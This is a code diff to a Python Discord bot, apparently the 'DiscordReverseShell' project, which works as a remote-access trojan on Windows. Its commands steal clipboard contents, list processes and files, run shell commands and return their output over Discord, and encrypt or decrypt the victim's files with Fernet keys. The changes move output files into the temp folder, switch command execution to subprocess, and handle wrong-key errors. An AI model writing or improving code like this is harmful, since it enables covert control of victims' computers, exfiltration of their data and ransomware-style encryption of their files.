@@ -125,7 +125,7 @@ def check_internet():
     
 
 
-commands = "\n".join([
+commands = "\n\r".join([
     "help - Help command",
     "ping - Ping command",
     "sys - System information",
@@ -387,11 +387,11 @@ async def on_message(message):
         if clipboard == "":
             clipboard = "null"
         elif len(clipboard) > 1500:
-            with open("clipboard.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\\clipboard.txt", "w", encoding="utf-8") as f:
                 f.write(clipboard)
-            clipboard_file = discord.File("clipboard.txt")
+            clipboard_file = discord.File(f"{os.getenv('temp')}\\clipboard.txt")
             await message.reply(file=clipboard_file)
-            delete_files(["clipboard.txt"])
+            delete_files([f"{os.getenv('temp')}\\clipboard.txt"])
             return
         
         embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
@@ -401,17 +401,18 @@ async def on_message(message):
 #! PROCESSES    
     elif message.content == "processes":
         try: 
-            tasks = os.popen("tasklist").read()
+            #tasks = os.popen("tasklist").read()
+            tasks = subprocess.Popen("tasklist", shell=True, stdout=subprocess.PIPE).communicate()[0].decode() #os.popen("tasklist").read()
         except:
             await message.reply("Failed to fetch task list!") 
             return
 
 
         if len(tasks) > 1500:
-            with open("tasklist.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\\tasklist.txt", "w", encoding="utf-8") as f:
                 f.write(tasks)
-            await message.reply(file=discord.File("tasklist.txt"))
-            delete_files(["tasklist.txt"])
+            await message.reply(file=discord.File(f"{os.getenv('temp')}\\tasklist.txt"))
+            delete_files([f"{os.getenv('temp')}\\tasklist.txt"])
         else:
             embed = discord.Embed(title="Processes", description=f"```{tasks}```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
@@ -441,13 +442,13 @@ async def on_message(message):
             files = "No Files Found"
             
         elif len(files) > 1500:
-            with open("files.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\\files.txt", "w", encoding="utf-8") as f:
                 f.write(files)
-            file = discord.File("files.txt")
+            file = discord.File(f"{os.getenv('temp')}\\files.txt")
             embed = discord.Embed(title=f"Files > {os.getcwd()}", description="", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(file=file, embed=embed)
-            delete_files(["files.txt"])
+            delete_files([f"{os.getenv('temp')}\\files.txt"])
             return
         
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
@@ -521,24 +522,24 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         
         if len(normal_output) > 1500:
-            with open("output.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\\output.txt", "w", encoding="utf-8") as f:
                 f.write(normal_output)
             
-            file = discord.File("output.txt")
+            file = discord.File(f"{os.getenv('temp')}\\output.txt")
             await message.reply(file=file, embed=embed)
-            delete_files(["output.txt"])
+            delete_files([f"{os.getenv('temp')}\\output.txt"])
             return
         elif normal_output != "":
             embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
             
              
         if len(error_output) > 1500:
-            with open("error.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\\error.txt", "w", encoding="utf-8") as f:
                 f.write(error_output)
             
-            file = discord.File("error.txt")
+            file = discord.File(f"{os.getenv('temp')}\\error.txt")
             await message.reply(file=file, embed=embed)
-            delete_files(["error.txt"])
+            delete_files([f"{os.getenv('temp')}\\error.txt"])
             return      
         elif error_output != "":
             embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
@@ -564,24 +565,24 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         
         if len(normal_output) > 1500:
-            with open("output.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\\output.txt", "w", encoding="utf-8") as f:
                 f.write(normal_output)
             
-            file = discord.File("output.txt")
+            file = discord.File(f"{os.getenv('temp')}\\output.txt")
             await message.reply(file=file, embed=embed)
-            delete_files(["output.txt"])
+            delete_files([f"{os.getenv('temp')}\\output.txt"])
             return
         elif normal_output != "":
             embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
 
 
         if len(error_output) > 1500:
-            with open("error.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\\error.txt", "w", encoding="utf-8") as f:
                 f.write(error_output)
             
-            file = discord.File("error.txt")
+            file = discord.File(f"{os.getenv('temp')}\\error.txt")
             await message.reply(file=file, embed=embed)
-            delete_files(["error.txt"])
+            delete_files([f"{os.getenv('temp')}\\error.txt"])
             return
         elif error_output != "":
             embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
@@ -946,8 +947,13 @@ async def on_message(message):
             return
 
         for key in keys:
-            #key = fernet.Fernet.generate_key()
-            f = fernet.Fernet(key.encode())
+            try: f = fernet.Fernet(key.encode())
+            except:
+                if len(keys) > 1: embed = discord.Embed(title="Decrypt",  description=f"```Wrong key!```", color=0xfafafa)
+                else: embed = discord.Embed(title="Decrypt",  description=f"```Wrong keys!```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+                return
             
             if decrypt(path, f) == False:
                 embed = discord.Embed(title="Decrypt",  description=f"```Invalid file path or wrong key, make sure that path is valid and it is file not directory!```", color=0xfafafa)
